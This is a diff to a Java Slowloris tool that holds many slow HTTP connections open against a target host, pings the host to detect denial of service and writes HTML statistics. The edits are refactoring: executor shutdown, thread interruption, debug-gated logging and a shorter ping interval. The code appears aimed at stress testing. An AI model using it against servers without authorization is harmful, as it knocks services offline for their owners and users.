@@ -6,7 +6,7 @@ import java.net.SocketTimeoutException;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.HashMap;
-import java.util.concurrent.Executor;
+import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class SlowLoris {
@@ -34,12 +34,12 @@ public class SlowLoris {
     /** List of Command Line Arguments */
     final static HashMap<String, String> CLA = new HashMap<String, String>();
 
-    final static String USEAGE = "-h hostname -p port "
-            + "-c No_of_connections -i Interval_Between_Headers_in_ms"
-            + "-t test_Duration -r connections_per_s"
-            + "-d Output_directory -o probe Timeout";
+    final static String USEAGE = "-h hostname\n -p port\n"
+            + "-c No_of_connections\n -i Interval_Between_Headers_in_ms\n"
+            + "-t test_Duration\n -r connections_per_s\n"
+            + "-d Output_directory\n -o probe Timeout\n";
 
-    private final Executor exec;
+    private final ExecutorService exec;
 
     // Set Default Values 
     static{
@@ -72,7 +72,9 @@ public class SlowLoris {
                     Thread.sleep(995);
                 } catch (InterruptedException e) {
                     // TODO Auto-generated catch block
-                    e.printStackTrace();
+                    if(DEBUG)
+                        e.printStackTrace();
+                    break;
                 }
             }
         }
@@ -97,15 +99,17 @@ public class SlowLoris {
                 } catch (SocketTimeoutException e) {
                     setDOSed();
                 } catch(IOException e){
-                    e.printStackTrace();
+                    if(DEBUG)
+                        e.printStackTrace();
                 }
 
                 try {
-                    Thread.sleep(500);
+                    Thread.sleep(50);
                 } catch (InterruptedException e) {
                     // TODO Auto-generated catch block
                     if(DEBUG)
                         e.printStackTrace();
+                    break;
                 }
             }
         }
@@ -122,6 +126,10 @@ public class SlowLoris {
             case CLOSED:
                 //if(closed == connections) return;
                 connected--;
+                closed++;
+                break;
+            case ERROR:
+                pending--;
                 closed++;
                 break;
             default: 
@@ -168,18 +176,22 @@ public class SlowLoris {
     }
 
     public void attack(){
-        System.out.println("Attack Started for Duration : " + time/1000 + "s");
+        if(DEBUG)
+            System.out.println("Attack Started for Duration : " + time/1000 + "s");
         long sTime = System.currentTimeMillis() - 500;
         int i = 0;
         int conn = connections;
+        Stats.printConsoleParam();
         // To perform Http PING repeatedly 
-        new Thread(ping).start();
+        Thread httpPing = new Thread(ping);
+        httpPing.start();
 
         // To Save the network snapshots in the interval of 1s
-        new Thread(UPDATE_STATS).start();
+        Thread US = new Thread(UPDATE_STATS);
+        US.start();
 
         while(System.currentTimeMillis() - sTime < time){
-            for(int r = 0; r < rate && conn > 0; r++, conn--) {
+            for(int r = 0; r < rate && conn > 0 && isAvailable; r++, conn--) {
                 exec.execute(new Connection(hostname, port, interval, this, i += 3));
             }
 
@@ -187,12 +199,16 @@ public class SlowLoris {
                 Thread.sleep(1000);
             } catch (InterruptedException e) {
                 // TODO Auto-generated catch block
-                e.printStackTrace();
+                if(SlowLoris.DEBUG)
+                    e.printStackTrace();
             }
         }
 
+        httpPing.interrupt();
+        US.interrupt();
         Stats.genHTML();
-        System.exit(0);
+        exec.shutdownNow();
+        Connection.update(null);
     }
 
     private static int getCLAInt(String key) {
